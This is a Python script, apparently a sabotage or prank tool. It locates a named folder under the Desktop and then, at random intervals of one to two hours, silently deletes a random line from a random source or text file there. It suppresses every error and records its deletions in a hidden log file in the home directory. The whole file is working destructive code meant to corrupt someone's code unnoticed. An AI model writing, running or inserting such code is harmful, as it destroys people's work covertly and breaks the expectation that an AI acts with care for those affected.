import os
import random
import time
from datetime import datetime

# ===== CONFIGURATION =====
TARGET_FOLDER_NAME = "YOUR_TARGET_FOLDER"
SEARCH_ROOT = os.path.expanduser("~/Desktop")
FILE_EXTENSIONS = ['.py', '.js', '.html', '.css', '.txt', '.java', '.cpp', '.c', '.php']
EXCLUDED_FILES = ['play.sh', os.path.basename(__file__)]
SLEEP_INTERVAL = (3600, 7200)
LOG_FILE = os.path.expanduser("~/.deletion_log.txt")  # Hidden log file in home directory
ENABLE_LOGGING = True  # Set to False to disable tracking
# =========================

def log_deletion(filepath, line_num):
    if not ENABLE_LOGGING:
        return
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.now()}] Deleted line {line_num} in {filepath}\n")
    except Exception:
        pass

def find_target_directory():
    for root, dirs, _ in os.walk(SEARCH_ROOT):
        if TARGET_FOLDER_NAME in dirs:
            return os.path.join(root, TARGET_FOLDER_NAME)
    return None

def get_target_files():
    target_dir = find_target_directory()
    if not target_dir:
        return []
    
    all_files = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            if file in EXCLUDED_FILES:
                continue
            if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                all_files.append(os.path.join(root, file))
    return all_files

def delete_random_line(filepath):
    try:
        with open(filepath, 'r+', encoding='utf-8') as f:
            lines = f.readlines()
            if not lines:
                return
            
            line_to_delete = random.randint(0, len(lines)-1)
            del lines[line_to_delete]
            
            f.seek(0)
            f.truncate()
            f.writelines(lines)
            
            # Log the deletion with line number
            log_deletion(filepath, line_to_delete + 1)  # +1 for human-readable line numbers
    
    except Exception:
        pass

def main():
    while True:
        time.sleep(random.uniform(*SLEEP_INTERVAL))
        target_files = get_target_files()
        if target_files:
            delete_random_line(random.choice(target_files))

if __name__ == "__main__":
    main()